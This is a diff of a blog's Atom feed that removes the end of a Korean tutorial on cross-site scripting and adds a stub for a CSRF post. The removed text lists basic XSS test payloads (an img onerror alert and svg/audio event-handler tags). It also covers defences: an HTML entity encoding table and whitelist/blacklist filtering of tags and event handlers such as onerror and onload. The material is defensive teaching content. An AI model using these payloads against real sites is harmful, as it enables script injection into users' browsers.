-  <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" title="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src=x onerror="alert(1)"&gt;
-- onactivate
-- onload
-
-&lt;svg&gt;
-&lt;audio src="" onplay="" autoplay&gt;
-</code></pre></div></div>
-
-<h2 id="대응-방안">대응 방안</h2>
-<h3 id="html-entity">HTML Entity</h3>
-<ul>
-  <li>HTML 특수 문자들을 HTML Entity 로 모두 치환하면 된다.</li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th>문자</th>
-      <th>인코딩 된 문자</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
-      <td><code class="language-plaintext highlighter-rouge">&amp;amp;</code></td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
-      <td><code class="language-plaintext highlighter-rouge">&amp;lt;</code></td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
-      <td><code class="language-plaintext highlighter-rouge">&amp;gt;</code></td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">'</code></td>
-      <td><code class="language-plaintext highlighter-rouge">&amp;#x27;</code></td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">"</code></td>
-      <td><code class="language-plaintext highlighter-rouge">&amp;quot;</code></td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">(</code></td>
-      <td><code class="language-plaintext highlighter-rouge">&amp;#40;</code></td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">)</code></td>
-      <td><code class="language-plaintext highlighter-rouge">&amp;#41;</code></td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/</code></td>
-      <td><code class="language-plaintext highlighter-rouge">&amp;#x2F;</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<h3 id="문제점">문제점</h3>
-<ul>
-  <li>하지만 HTML Editor 게시판에서는 전부 치환을 못한다.</li>
-  <li>잘 사용하지 않는 게시판이면 해당 게시판을 안쓰는 것이 좋다.</li>
-  <li>잘 사용되는 게시판이라면 <strong>White List 기반 필터링</strong> 과 <strong>Black List 기반 필터링</strong>을 같이 적용해야한다.
-    <blockquote>
-      <p>step 1. 모든 HTML 특수 문자들을 HTML Entity 로 치환한다.<br /><br />
-step 2. <strong>White List</strong> 기반 필터링으로 살려줄 (허용해줄) 태그를 살려 준다.<br />ex) img, p, a, …<br /><br />
-step 3. <strong>Black List</strong> 기반으로 Event Handler를 필터링 하기.<br />ex) onerror, onload 막기</p>
-    </blockquote>
-  </li>
-</ul>
-
-<h2 id="참고">참고</h2>
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> 태그 안에서는 <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> 태그가 안 먹힌다.</li>
-</ul>
-
-<h2 id="참고-사이트">참고 사이트</h2>
-<ul>
-  <li><a href="https://junhyunny.github.io/information/security/dom-based-cross-site-scripting/">DOM 기반 XSS(DOM based Cross Site Scripting) 공격과 방어 - Junhyunny’s Devlogs</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><category term="javascript" /><category term="html" /><summary type="html"><![CDATA[XSS ( Cross-Site Scripting ) 란 클라이언트 측 스크립트를 삽입하는 공격이다. 웹 애플리케이션에서 발생하는 취약점이다. 클라이언트 만이 피해를 입는다. 즉 서버에는 아무런 악영향을 안 끼친다. 클라이언트의 브라우저에서 개발자가 의도하지 않았던 스크립트가 실행된다. 취약한 웹 애플리케이션을 이용하는 사용자가 주 타겟이 된다. 사용자 쿠키를 탈취하는 세션 하이재킹( session hijacking ) 공격을 수행할 수 있다.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 란 무엇일까.]]></summary></entry></feed>
